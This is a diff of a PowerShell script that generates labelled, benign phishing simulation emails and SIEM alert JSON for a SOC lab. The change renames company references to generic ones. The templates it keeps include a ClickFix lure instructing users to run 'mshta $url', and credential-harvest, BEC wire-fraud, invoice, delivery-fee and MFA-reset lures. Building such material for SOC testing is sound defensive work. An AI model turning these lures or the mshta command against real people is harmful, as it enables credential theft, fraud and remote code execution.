@@ -1,14 +1,14 @@
 # ============================================================
 # Generate-PhishingArtifacts.ps1
-# ECI SOC Team — Qevlar POC (Defensive Testing Only)
-# Generates benign phishing EML files and Elastic/Qevlar JSON alerts
+# Internal SOC Team — Phishing Simulation Lab (Defensive Testing Only)
+# Generates benign phishing EML files and Elastic/SOC JSON alerts
 # ============================================================
 
 [CmdletBinding()]
 param(
     [string]$OutputDir     = ".\phishing_artifacts",
     [string]$TestBaseUrl   = "http://phishtest.internal",
-    [string]$TargetDomain  = "eci.com",
+    [string]$TargetDomain  = "novacorp.com",
     [int]   $CountPerType  = 3
 )
 
@@ -25,7 +25,7 @@ function New-Dirs {
         "emails\html_attachment","emails\bec","emails\invoice",
         "emails\delivery","emails\mfa_reset",
         "html_attachments","siem_alerts\elastic","siem_alerts\sentinel",
-        "qevlar_payloads","reports"
+        "soc_payloads","reports"
     )
     foreach ($d in $subdirs) {
         $path = Join-Path $OutputDir $d
@@ -84,8 +84,8 @@ Message-ID: $msgId
 MIME-Version: 1.0
 X-Mailer: $(Get-RandomElement $mailers)
 X-Originating-IP: $(Get-FakeIP)
-X-Simulation-Type: PHISHING-POC-BENIGN-ECI
-X-SOC-Test-ID: QEVLAR-POC-$(Get-ShortGuid)
+X-Simulation-Type: PHISHING-SIM-BENIGN
+X-SOC-Test-ID: SOC-SIM-$(Get-ShortGuid)
 Content-Type: multipart/mixed; boundary="$boundary"
 
 --$boundary
@@ -95,7 +95,7 @@ Content-Type: multipart/alternative; boundary="alt_$boundary"
 Content-Type: text/plain; charset=UTF-8
 
 $PlainBody
-[SOC SIMULATION — ECI QEVLAR POC — NOT MALICIOUS]
+[SOC SIMULATION — NOT MALICIOUS]
 --alt_$boundary
 Content-Type: text/html; charset=UTF-8
 
@@ -155,7 +155,7 @@ function New-ClickFixEmail {
 <strong>Security Verification Required</strong><br>Automated bots detected from your network segment.</div>
 <p>Press <strong>Windows + R</strong>, paste the command below, press <strong>Enter</strong>:</p>
 <div style="background:#1e1e1e;color:#4ec9b0;font-family:monospace;padding:14px;border-radius:4px;">mshta $url</div>
-<p style="font-size:11px;color:#aaa;margin-top:20px;">[SOC SIMULATION — CLICKFIX — ECI QEVLAR POC]</p>
+<p style="font-size:11px;color:#aaa;margin-top:20px;">[SOC SIMULATION — CLICKFIX]</p>
 </td></tr></table></div></body></html>
 "@
     $eml = New-EmlContent -FromName "IT Help Desk" -FromEmail $sender -ToEmail "user@$TargetDomain" `
@@ -190,7 +190,7 @@ function New-CredentialHarvestEmail {
 <tr><td style="padding:8px 12px;">Date</td><td style="padding:8px 12px;">$($date.ToString('MMMM dd, yyyy HH:mm UTC'))</td></tr>
 </table>
 <a href="$url" style="display:inline-block;background:#0078d4;color:#fff;padding:10px 24px;text-decoration:none;border-radius:2px;font-size:14px;">Review Recent Activity</a>
-<p style="font-size:10px;color:#aaa;margin-top:20px;">[SOC SIMULATION — CREDENTIAL HARVEST — ECI QEVLAR POC]</p></div></div></body></html>
+<p style="font-size:10px;color:#aaa;margin-top:20px;">[SOC SIMULATION — CREDENTIAL HARVEST]</p></div></div></body></html>
 "@
     $attachContent = Get-HtmlCredentialPage
     $attachments = @(@{Filename="SecureDocument.html"; MimeType="text/html"; Content=$attachContent})
@@ -234,8 +234,8 @@ function New-BECEmail {
 <tr style="background:#f7fafc;"><td style="padding:8px 12px;"><strong>Account</strong></td><td style="padding:8px 12px;">$acct</td></tr>
 <tr><td style="padding:8px 12px;"><strong>Reference</strong></td><td style="padding:8px 12px;">$ref</td></tr></table>
 <p>I'm in back-to-back meetings but will check messages. Confirm once initiated.</p>
-<p><strong>$exName</strong><br>$exTitle, ECI</p>
-<p style="font-size:10px;color:#aaa;">[SOC SIMULATION — BEC — ECI QEVLAR POC]</p>
+<p><strong>$exName</strong><br>$exTitle, NovaCorp</p>
+<p style="font-size:10px;color:#aaa;">[SOC SIMULATION — BEC — ]</p>
 </div></body></html>
 "@
     $eml = New-EmlContent -FromName "$exName — $exTitle" -FromEmail $sender -ToEmail "finance@$TargetDomain" `
@@ -271,7 +271,7 @@ function New-InvoiceEmail {
 <tr><td style="padding:10px 0;border-bottom:1px solid #e2e8f0;"><strong>Amount Due</strong></td><td style="padding:10px 0;font-size:20px;font-weight:700;color:#e53e3e;">`$$("{0:N0}" -f $amount).00</td></tr>
 <tr style="background:#fff;"><td style="padding:10px 0;"><strong>Due Date</strong></td><td style="padding:10px 0;color:#e53e3e;">$due (OVERDUE)</td></tr></table>
 <a href="$payUrl" style="background:#e53e3e;color:#fff;padding:12px 28px;text-decoration:none;border-radius:4px;display:inline-block;font-weight:700;">Pay Now — Avoid Penalty</a>
-<p style="font-size:10px;color:#aaa;margin-top:20px;">[SOC SIMULATION — INVOICE PHISHING — ECI QEVLAR POC]</p>
+<p style="font-size:10px;color:#aaa;margin-top:20px;">[SOC SIMULATION — INVOICE PHISHING — ]</p>
 </div></div></body></html>
 "@
     $eml = New-EmlContent -FromName "$vendor Billing" -FromEmail $sender -ToEmail "accounts@$TargetDomain" `
@@ -306,7 +306,7 @@ function New-DeliveryEmail {
 <p><strong>Status:</strong> <span style="color:orange;font-weight:600;">HELD — Awaiting Payment</span></p>
 <p><strong>Customs Fee:</strong> <strong style="color:#e53e3e;font-size:18px;">₹$("{0:N0}" -f $fee)</strong></p></div>
 <a href="$payUrl" style="background:#ff6600;color:#fff;padding:10px 24px;text-decoration:none;border-radius:4px;display:inline-block;">Pay Fee &amp; Reschedule Delivery</a>
-<p style="font-size:10px;color:#aaa;margin-top:20px;">[SOC SIMULATION — DELIVERY PHISHING — ECI QEVLAR POC]</p>
+<p style="font-size:10px;color:#aaa;margin-top:20px;">[SOC SIMULATION — DELIVERY PHISHING — ]</p>
 </div></div></body></html>
 "@
     $eml = New-EmlContent -FromName "$carrier Delivery" -FromEmail $sender -ToEmail "user@$TargetDomain" `
@@ -337,7 +337,7 @@ function New-MfaResetEmail {
 <p>If this was not you, your account may be compromised. Verify your identity immediately.</p>
 <a href="$verUrl" style="background:#e53e3e;color:#fff;padding:12px 28px;text-decoration:none;border-radius:4px;display:inline-block;font-weight:700;">Secure My Account Now</a>
 <p style="color:#718096;font-size:13px;margin-top:16px;">This link expires in <strong>15 minutes</strong>.<br>Reference: $($token.Substring(0,12))...</p>
-<p style="font-size:10px;color:#aaa;margin-top:20px;">[SOC SIMULATION — MFA RESET PHISHING — ECI QEVLAR POC]</p>
+<p style="font-size:10px;color:#aaa;margin-top:20px;">[SOC SIMULATION — MFA RESET PHISHING — ]</p>
 </div></div></body></html>
 "@
     $eml = New-EmlContent -FromName "IT Security — Account Alert" -FromEmail $sender -ToEmail "user@$TargetDomain" `
@@ -353,7 +353,7 @@ function New-MfaResetEmail {
 }
 
 # ─────────────────────────────────────────────────────────────
-# SIEM / QEVLAR ALERT GENERATOR
+# SIEM / SOC ALERT GENERATOR
 # ─────────────────────────────────────────────────────────────
 
 $AlertMeta = @{
@@ -387,12 +387,12 @@ function New-ElasticAlert($artifact) {
             subject = $artifact.subject
         }
         "url"                              = @{full = $artifact.ioc.url}
-        "labels"                           = @{simulation="true"; poc="qevlar"; phishing_type=$artifact.type}
-        "tags"                             = @("phishing","poc-simulation","qevlar",$artifact.type)
+        "labels"                           = @{simulation="true"; poc="soc-sim"; phishing_type=$artifact.type}
+        "tags"                             = @("phishing","poc-simulation","soc-sim",$artifact.type)
     }
 }
 
-function New-QevlarPayload($artifact, $elastic) {
+function New-SocPayload($artifact, $elastic) {
     return @{
         alert_id         = $elastic["kibana.alert.uuid"]
         source_siem      = "elastic"
@@ -424,7 +424,7 @@ function New-QevlarPayload($artifact, $elastic) {
 # MAIN
 # ─────────────────────────────────────────────────────────────
 
-Write-Host "[+] Phishing Artifact Generator — ECI Qevlar POC" -ForegroundColor Cyan
+Write-Host "[+] Phishing Artifact Generator — Internal SOC Lab" -ForegroundColor Cyan
 Write-Host "[+] Output   : $OutputDir" -ForegroundColor Gray
 Write-Host "[+] Test URL : $TestBaseUrl" -ForegroundColor Gray
 Write-Host "[+] Samples  : $CountPerType per category`n" -ForegroundColor Gray
@@ -447,11 +447,11 @@ foreach ($gen in $generators) {
         try {
             $artifact = & $gen
             $elastic  = New-ElasticAlert $artifact
-            $qevlar   = New-QevlarPayload $artifact $elastic
+            $soc_payload = New-SocPayload $artifact $elastic
 
             $base = "$($artifact.type)_$(Get-ShortGuid)"
             $elastic | ConvertTo-Json -Depth 10 | Out-File (Join-Path $OutputDir "siem_alerts\elastic\$base.json") -Encoding utf8
-            $qevlar  | ConvertTo-Json -Depth 10 | Out-File (Join-Path $OutputDir "qevlar_payloads\$base.json") -Encoding utf8
+            $soc_payload | ConvertTo-Json -Depth 10 | Out-File (Join-Path $OutputDir "soc_payloads\$base.json") -Encoding utf8
 
             $allArtifacts += $artifact
             Write-Host "  [+] $($artifact.type.PadRight(30)) $(Split-Path $artifact.file -Leaf)" -ForegroundColor Green
@@ -473,6 +473,6 @@ $manifest | ConvertTo-Json -Depth 10 | Out-File (Join-Path $OutputDir "reports\m
 Write-Host "`n[+] Done. $($allArtifacts.Count) artifacts generated." -ForegroundColor Cyan
 Write-Host "    EML files      : $OutputDir\emails\" -ForegroundColor Gray
 Write-Host "    Elastic alerts : $OutputDir\siem_alerts\elastic\" -ForegroundColor Gray
-Write-Host "    Qevlar payloads: $OutputDir\qevlar_payloads\" -ForegroundColor Gray
+Write-Host "    SOC payloads   : $OutputDir\soc_payloads\" -ForegroundColor Gray
 Write-Host "    Manifest       : $OutputDir\reports\manifest.json" -ForegroundColor Gray
-Write-Host "`n[!] All artifacts are benign. For ECI SOC / Qevlar POC use only.`n" -ForegroundColor Yellow
+Write-Host "`n[!] All artifacts are benign. For internal SOC use only.`n" -ForegroundColor Yellow
